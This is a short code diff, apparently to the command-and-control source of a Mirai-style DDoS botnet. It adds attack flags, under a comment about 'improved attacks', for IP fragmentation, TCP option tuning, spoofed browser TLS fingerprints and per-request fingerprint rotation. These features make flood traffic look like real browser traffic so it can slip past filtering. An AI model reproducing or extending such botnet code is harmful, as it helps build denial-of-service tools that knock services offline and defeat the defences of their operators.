@@ -61,6 +61,14 @@ var flagInfoLookup map[string]FlagInfo = map[string]FlagInfo{
 	"tcpport":   FlagInfo{19, "TCP port for AXIS-TCP"},
 	"udpport":   FlagInfo{20, "UDP port for AXIS-UDP"},
 	"greport":   FlagInfo{21, "GRE port for AXIS-TCP/AXIS-UDP"},
+	/* New flags for improved attacks - FUTURE IMPROVEMENTS */
+	"fragment":  FlagInfo{22, "Enable IP fragmentation (0 or 1)"},
+	"mss":       FlagInfo{23, "TCP MSS option value (536, 1460, 2048, 4096, 8192)"},
+	"wscale":    FlagInfo{24, "TCP window scale value (0-8)"},
+	"timestamp": FlagInfo{25, "Enable TCP timestamps (0 or 1)"},
+	"adaptive":  FlagInfo{26, "Enable adaptive vector weighting (0 or 1)"},
+	"tlsfp":     FlagInfo{27, "TLS fingerprint profile (chrome, firefox, safari, edge)"},
+	"fprot":     FlagInfo{28, "Enable per-request fingerprint rotation (0 or 1)"},
 }
 
 /*
